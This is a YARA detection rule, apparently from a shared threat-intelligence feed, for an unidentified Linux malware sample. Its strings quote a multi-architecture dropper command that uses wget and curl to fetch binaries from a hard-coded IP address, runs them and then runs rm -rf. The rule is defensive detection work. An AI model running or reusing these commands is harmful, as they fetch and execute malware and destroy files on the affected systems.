rule MULTI_Sample_Unique_098a8592
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (inconnu, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "098a85921ef63f6076c18316d8437759f7c143794f4f4bf53901db1a12fac728"
        yarahub_uuid = "d9aec9b7-46b0-46af-bdc3-10f4bdc64a98"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "inconnu"
        etat = "binaire"
        confidence_suggeree = "low"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "af1c391023498713fbea2c3937d5e499"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "wget http://222.255.181.15/bins/xnxnxnxnxnxnxnxnaarch64xnxn; curl -O http://222.255.181.15/bins/xnxnxnxnxnxnxnxnaarch64xnxn; chmod +x xnxnxnxnxnxnxnxnaarch64xnxn; ./xnxnxnxnxnxnxnxnaarch64xnxn; rm -rf" ascii
        $s1 = "wget http://222.255.181.15/bins/xnxnxnxnxnxnxnxni386xnxn; curl -O http://222.255.181.15/bins/xnxnxnxnxnxnxnxni386xnxn; chmod +x xnxnxnxnxnxnxnxni386xnxn; ./xnxnxnxnxnxnxnxni386xnxn; rm -rf xnxnxnxnxnx" ascii
        $s2 = "wget http://222.255.181.15/bins/xnxnxnxnxnxnxnxnloongarch64xnxn; curl -O http://222.255.181.15/bins/xnxnxnxnxnxnxnxnloongarch64xnxn; chmod +x xnxnxnxnxnxnxnxnloongarch64xnxn; ./xnxnxnxnxnxnxnxnloongar" ascii
        $s3 = "wget http://222.255.181.15/bins/xnxnxnxnxnxnxnxnm68kxnxn; curl -O http://222.255.181.15/bins/xnxnxnxnxnxnxnxnm68kxnxn; chmod +x xnxnxnxnxnxnxnxnm68kxnxn; ./xnxnxnxnxnxnxnxnm68kxnxn; rm -rf xnxnxnxnxnx" ascii
        $s4 = "wget http://222.255.181.15/bins/xnxnxnxnxnxnxnxnmicroblazexnxn; curl -O http://222.255.181.15/bins/xnxnxnxnxnxnxnxnmicroblazexnxn; chmod +x xnxnxnxnxnxnxnxnmicroblazexnxn; ./xnxnxnxnxnxnxnxnmicroblaze" ascii
        $s5 = "wget http://222.255.181.15/bins/xnxnxnxnxnxnxnxnmipsxnxn; curl -O http://222.255.181.15/bins/xnxnxnxnxnxnxnxnmipsxnxn; chmod +x xnxnxnxnxnxnxnxnmipsxnxn; ./xnxnxnxnxnxnxnxnmipsxnxn; rm -rf xnxnxnxnxnx" ascii
        $s6 = "wget http://222.255.181.15/bins/xnxnxnxnxnxnxnxnor1kxnxn; curl -O http://222.255.181.15/bins/xnxnxnxnxnxnxnxnor1kxnxn; chmod +x xnxnxnxnxnxnxnxnor1kxnxn; ./xnxnxnxnxnxnxnxnor1kxnxn; rm -rf xnxnxnxnxnx" ascii
        $s7 = "wget http://222.255.181.15/bins/xnxnxnxnxnxnxnxnpowerpcxnxn; curl -O http://222.255.181.15/bins/xnxnxnxnxnxnxnxnpowerpcxnxn; chmod +x xnxnxnxnxnxnxnxnpowerpcxnxn; ./xnxnxnxnxnxnxnxnpowerpcxnxn; rm -rf" ascii
        $s8 = "wget http://222.255.181.15/bins/xnxnxnxnxnxnxnxnriscv32xnxn; curl -O http://222.255.181.15/bins/xnxnxnxnxnxnxnxnriscv32xnxn; chmod +x xnxnxnxnxnxnxnxnriscv32xnxn; ./xnxnxnxnxnxnxnxnriscv32xnxn; rm -rf" ascii
        $s9 = "wget http://222.255.181.15/bins/xnxnxnxnxnxnxnxnriscv64xnxn; curl -O http://222.255.181.15/bins/xnxnxnxnxnxnxnxnriscv64xnxn; chmod +x xnxnxnxnxnxnxnxnriscv64xnxn; ./xnxnxnxnxnxnxnxnriscv64xnxn; rm -rf" ascii
        $s10 = "wget http://222.255.181.15/bins/xnxnxnxnxnxnxnxnsh2xnxn; curl -O http://222.255.181.15/bins/xnxnxnxnxnxnxnxnsh2xnxn; chmod +x xnxnxnxnxnxnxnxnsh2xnxn; ./xnxnxnxnxnxnxnxnsh2xnxn; rm -rf xnxnxnxnxnxnxnx" ascii
        $s11 = "wget http://222.255.181.15/bins/xnxnxnxnxnxnxnxnsh4xnxn; curl -O http://222.255.181.15/bins/xnxnxnxnxnxnxnxnsh4xnxn; chmod +x xnxnxnxnxnxnxnxnsh4xnxn; ./xnxnxnxnxnxnxnxnsh4xnxn; rm -rf xnxnxnxnxnxnxnx" ascii
        $s12 = "wget http://222.255.181.15/bins/xnxnxnxnxnxnxnxnx86_64xnxn; curl -O http://222.255.181.15/bins/xnxnxnxnxnxnxnxnx86_64xnxn; chmod +x xnxnxnxnxnxnxnxnx86_64xnxn; ./xnxnxnxnxnxnxnxnx86_64xnxn; rm -rf xnx" ascii
    condition:
        true and filesize < 50MB and 3 of them and 1 of ($s0, $s1, $s2, $s3, $s4)
}
